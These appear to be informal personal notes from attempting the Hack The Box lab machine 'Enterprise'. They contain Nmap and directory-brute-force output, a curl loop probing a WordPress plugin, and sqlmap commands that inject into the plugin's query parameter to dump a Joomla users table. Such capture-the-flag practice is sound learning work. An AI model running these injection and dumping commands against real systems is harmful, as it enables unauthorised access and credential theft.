Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-11 06:31 EDT
Nmap scan report for 10.129.94.125
Host is up (0.086s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 5.35 seconds

START_TIME: Tue Apr 11 06:49:57 2023
URL_BASE: http://enterprise.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                                                             GENERATED WORDS: 4612

---- Scanning URL: http://enterprise.htb/ ----
                                                                             + http://enterprise.htb/index.php (CODE:301|SIZE:0)                         
+ http://enterprise.htb/server-status (CODE:403|SIZE:302)                   
                                                                             ==> DIRECTORY: http://enterprise.htb/wp-admin/
                                                                             ==> DIRECTORY: http://enterprise.htb/wp-content/
                                                                             ==> DIRECTORY: http://enterprise.htb/wp-includes/
+ http://enterprise.htb/xmlrpc.php (CODE:405|SIZE:42)                       
                                                                            
---- Entering directory: http://enterprise.htb/wp-admin/ ----
                                                                             + http://enterprise.htb/wp-admin/admin.php (CODE:302|SIZE:0)                
                                                                             ==> DIRECTORY: http://enterprise.htb/wp-admin/css/
                                                                             ==> DIRECTORY: http://enterprise.htb/wp-admin/images/
                                                                             ==> DIRECTORY: http://enterprise.htb/wp-admin/includes/
+ http://enterprise.htb/wp-admin/index.php (CODE:302|SIZE:0)                
                                                                             ==> DIRECTORY: http://enterprise.htb/wp-admin/js/
                                                                             ==> DIRECTORY: http://enterprise.htb/wp-admin/maint/
                                                                             ==> DIRECTORY: http://enterprise.htb/wp-admin/network/
                                                                             ==> DIRECTORY: http://enterprise.htb/wp-admin/user/
                                                                            
---- Entering directory: http://enterprise.htb/wp-content/ ----

   
![](20230411070651.png)

The server is very unstable actually

based on limited walkthorugh i have seen its  about brute forcing some or the other directory ot get admin access but not able  to brute force because of website unstability.

for advanced nmap scan
nmap -p 22,80,443,8080 -sCV -Pn  enterprise.htb

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4e98cc5b55223f4b8ced1964ac0faac (RSA)
|   256 f39a8558aad981382dea1518f78edd42 (ECDSA)
|_  256 debf116dc027e3fc1b34c04f4f6c768b (ED25519)
80/tcp   open  http     Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-generator: WordPress 4.8.1
|_http-title: USS Enterprise &#8211; Ships Log
443/tcp  open  ssl/http Apache httpd 2.4.25
| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
| Not valid before: 2017-08-25T10:35:14
|_Not valid after:  2017-09-24T10:35:14
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.25 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http     Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
used wpscan

using feroxbuster
feroxbuster -u http://enterprise.htb -k

/files

nc enterprise.htb 32812

 for i in {0..100}; do echo -n "$i: "; curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=$i; done | grep . 
0:     

sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch
...[snip]...

qlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D joomladb -T edz2g_users --dump
...[snip]...

https://0xdf.gitlab.io/2021/06/16/htb-enterprise.html

too tough





